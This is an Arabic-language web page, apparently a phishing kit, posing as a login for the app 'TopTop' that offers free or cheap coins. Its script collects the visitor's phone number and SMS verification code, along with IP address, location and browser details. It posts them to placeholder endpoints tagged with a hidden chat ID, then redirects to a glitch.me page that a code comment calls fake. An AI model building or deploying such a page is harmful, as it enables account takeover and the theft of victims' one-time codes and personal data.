     <style>
        body {

            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #FF6B6B, #4ECDC4);
            color: #ffffff;
            overflow: auto;
            position: relative;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            backdrop-filter: blur(8px);
            position: relative;
            z-index: 2;
        }

        .login-container {
            max-width: 500px;
            padding: 30px;
            border-radius: 10px;
            background-color: rgba(0, 0, 0, 0.8);
            box-shadow: 0 4px 10px rgba(0,0,0,0.6);
        }

        .login-container h1 {
            margin: 0 0 20px;
            font-size: 32px;
            color: #FFD700;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 8px;
            box-sizing: border-box;

            font-size: 18px;
        }

        button {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 8px;
            background-color: #FFD700;
            color: #333;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease;
        }

        button:hover {
            background-color: #FFC000;
            transform: scale(1.02);

        .pricing-section {
            margin-top: 20px;
            padding: 20px;
            border-radius: 10px;
            background-color: rgba(0, 0, 0, 0.7);
            box-shadow: 0 4px 10px rgba(0,0,0,0.6);
        }

        .pricing-section h2 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #FFD700;
        }

        .pricing-option {
            margin: 10px 0;
            padding: 15px;
            border-radius: 8px;
            background-color: #333;
            color: #FFD700;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .pricing-option span {
            font-size: 20px;
        }

        .pricing-option button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #FFD700;
            color: #333;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .pricing-option button:hover {
            background-color: #FFC000;
        }

        .message {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            padding: 10px;
            background-color: #FF6B6B;
            color: #fff;
            text-align: center;
            font-size: 18px;
            display: none;
            z-index: 3;
        }

        @keyframes backgroundAnimation {
            0% { background-position: 0% 0%; }
            50% { background-position: 100% 100%; }
            100% { background-position: 0% 0%; }
        }

        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://example.com/toptop-background.jpg') repeat;
            animation: backgroundAnimation 60s linear infinite;
            z-index: 1;
            opacity: 0.2;
        }
    </style>
</head>
<body>
     <div class="container">
        <div class="message" id="message"></div>
        
        <div id="login-container">
            <h1>تسجيل الدخول لـ TopTop</h1>
            <form id="loginForm">
                <label for="country">اختر الدولة:</label>
                <select id="country" name="country" required>
                    <option value="YE" data-code="+967">🇾🇪 اليمن (+967)</option>
                    <option value="SA" data-code="+966">🇸🇦 السعودية (+966)</option>
                    <option value="EG" data-code="+20">🇪🇬 مصر (+20)</option>
                    <option value="IQ" data-code="+964">🇮🇶 العراق (+964)</option>
                    <option value="LY" data-code="+218">🇱🇾 ليبيا (+218)</option>
                    <option value="JO" data-code="+962">🇯🇴 الأردن (+962)</option>
                    <option value="AE" data-code="+971">🇦🇪 الإمارات (+971)</option>
                    <option value="SD" data-code="+249">🇸🇩 السودان (+249)</option>
                    <option value="MA" data-code="+212">🇲🇦 المغرب (+212)</option>
                    <option value="SY" data-code="+963">🇸🇾 سوريا (+963)</option>
                    <option value="TN" data-code="+216">🇹🇳 تونس (+216)</option>
                    <option value="DZ" data-code="+213">🇩🇿 الجزائر (+213)</option>
                </select>
                <input type="text" id="phoneNumber" name="phoneNumber" placeholder="رقم الهاتف" required>
                <input type="hidden" name="chatId" value="YOUR_CHAT_ID_HERE">
                <button type="button" onclick="sendPhoneNumber()">إرسال رقم الهاتف</button>
            </form>
        </div>

        <div id="verification-container" style="display:none;">
            <h1>إدخال كود التحقق</h1>
            <form id="verificationForm">
                <input type="text" id="verificationCode" name="verificationCode" placeholder="أدخل الكود" required>
                <button type="submit">تأكيد الدخول</button>
            </form>
        </div>

        <div class="pricing-section">
            <h2>أسعار أكوانزات TopTop</h2>
            <div class="pricing-option">
                <span>1000 أكوانز - 0$</span>
                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">مجاني</button>
            </div>
            <div class="pricing-option">
                <span>2000 أكوانز - 2$</span>
                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
            </div>
            <div class="pricing-option">
                <span>5000 أكوانز - 5$</span>
                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
            </div>
            <div class="pricing-option">
                <span>10000 أكوانز - 10$</span>
                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
            </div>
        </div>
    </div>

    <script>
        function showMessage(message) {
            var messageElement = document.getElementById('message');
            messageElement.innerText = message;
            messageElement.style.display = 'block';
            setTimeout(function() {
                messageElement.style.display = 'none';
            }, 3000);
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    city: data.city
                };
            } catch (error) {
                console.error('Error fetching IP info:', error);
                return {
                    ip: 'Unknown',
                    country: 'Unknown',
                    city: 'Unknown'
                };
            }
        }

        function getPlatformInfo() {
            const ua = navigator.userAgent;
            let platform = "Unknown";
            if (/Windows/.test(ua)) platform = "Windows";
            else if (/Mac/.test(ua)) platform = "MacOS";
            else if (/Linux/.test(ua)) platform = "Linux";
            else if (/Android/.test(ua)) platform = "Android";
            else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";

            return {
                platform: platform,
                userAgent: ua
            };
        }

        async function sendPhoneNumber() {
            const phoneNumber = document.getElementById('phoneNumber').value;
            const country = document.getElementById('country').value;
            const chatId = document.querySelector('input[name="chatId"]').value;

            if (!phoneNumber || !country || !chatId) {
                showMessage('يرجى ملء جميع الحقول المطلوبة');
                return;
            }

            const ipInfo = await getIPInfo();
            const platformInfo = getPlatformInfo();

            try {
                // هنا يجب استبدال '/sendPhoneNumber' بعنوان URL الفعلي لخادمك
                const response = await fetch('/sendPhoneNumber', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phoneNumber,
                        country,
                        chatId,
                        ip: ipInfo.ip,
                        platform: platformInfo.platform,
                        userAgent: platformInfo.userAgent
                    })
                });

                const result = await response.json();
                if (result.success) {
                    showMessage('تم إرسال رمز التحقق');
                    document.getElementById('login-container').style.display = 'none';
                    document.getElementById('verification-container').style.display = 'block';
                } else {
                    showMessage('حدث خطأ أثناء إرسال رقم الهاتف. يرجى المحاولة مرة أخرى.');
                }
            } catch (error) {
                console.error('Error:', error);
                showMessage('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
            }
        }

        async function verifyCode(event) {
            event.preventDefault();
            const verificationCode = document.getElementById('verificationCode').value;
            const phoneNumber = document.getElementById('phoneNumber').value;
            const country = document.getElementById('country').value;
            const chatId = document.querySelector('input[name="chatId"]').value;

            if (!verificationCode || !phoneNumber || !country || !chatId) {
                showMessage('يرجى ملء جميع الحقول المطلوبة');
                return;
            }

            const ipInfo = await getIPInfo();
            const platformInfo = getPlatformInfo();

            try {
                // هنا يجب استبدال '/verifyCode' بعنوان URL الفعلي لخادمك
                const response = await fetch('/verifyCode', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        verificationCode,
                        phoneNumber,
                        country,
                        chatId,
                        ip: ipInfo.ip,
                        platform: platformInfo.platform,
                        userAgent: platformInfo.userAgent
                    })
                });

                const result = await response.json();
                if (result.success) {
                    showMessage('تم التحقق من الكود بنجاح');
                    // التوجيه إلى الرابط الوهمي بعد التحقق الناجح
                    setTimeout(() => {
                        window.location.href = "https://polarized-believed-fisherman.glitch.me/";
                    }, 3000);
                } else {
                    showMessage('فشل التحقق من الكود. يرجى المحاولة مرة أخرى.');
                }
            } catch (error) {
                console.error('Error:', error);
                showMessage('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            const verificationForm = document.getElementById('verificationForm');
            verificationForm.addEventListener('submit', verifyCode);
        });
    </script>
</body>
